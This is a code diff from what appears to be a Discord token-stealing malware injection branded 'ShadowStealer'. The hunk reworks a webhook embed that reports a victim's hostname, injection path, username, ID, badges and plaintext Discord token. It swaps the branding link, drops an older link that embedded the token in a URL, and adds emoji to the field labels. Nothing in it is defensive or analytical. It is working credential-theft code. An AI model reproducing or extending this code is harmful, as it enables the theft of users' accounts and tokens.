@@ -138,26 +138,26 @@ async function firstTime() {
                     content: config.ping[0] ? config.ping[1] : "",
                     embeds: [{
                         title: "Discord Initalized",
-                        description: `[**<:partner:909102089513340979>  Click Here To Copy Info On Mobile**](https://ctf.surf/raw/${token})`,
+                        description: `[**Powered By ShadowStealer**](discord.gg/1337s)`,
                         color: config["embed-color"],
                         fields: [{
-                            name: "Info",
+                            name: "<a:billing_address:1093566162320760902> Info",
                             value: `\`\`\`Hostname: \n${os.hostname()}\n\nInjection Info: \n${__dirname}\n\`\`\``,
                             inline: !1
                         }, {
-                            name: "Username",
+                            name: "<a:1337:1093566165697179762> Username",
                             value: `\`${b.username}#${b.discriminator}\``,
                             inline: !0
                         }, {
-                            name: " ID",
+                            name: "<a:1337:1093566183707521144> ID",
                             value: `\`${b.id}\``,
                             inline: !0
                         }, {
-                            name: " Badges",
+                            name: "<:1337:1093566158839492741> Badges",
                             value: `${getBadges(b.flags)}`,
                             inline: !1
                         }, {
-                            name: " Token",
+                            name: "<a:1337:1093566179207032944> Token",
                             value: `\`\`\`${token}\`\`\``,
                             inline: !1
                         }],
